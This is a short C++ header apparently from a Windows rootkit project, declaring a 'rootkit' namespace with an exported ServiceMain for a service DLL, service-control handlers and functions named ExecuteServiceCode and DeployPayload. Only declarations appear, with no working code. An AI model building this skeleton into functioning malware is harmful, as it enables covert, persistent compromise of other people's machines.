#pragma once
#include <Windows.h>

namespace rootkit
{
	extern "C" __declspec(dllexport) auto WINAPI ServiceMain(DWORD arg_c, LPWSTR * arg_v) -> VOID;

	auto Init(DWORD arg_c, LPWSTR* arg_v) -> void;
	auto UpdateServiceStatus(const DWORD current_state) -> void;
	auto ServiceHandler(DWORD control_code, DWORD event_type, LPVOID event_data, LPVOID context)->DWORD;
	auto ExecuteServiceCode() -> void;
	auto DeployPayload() -> bool;
}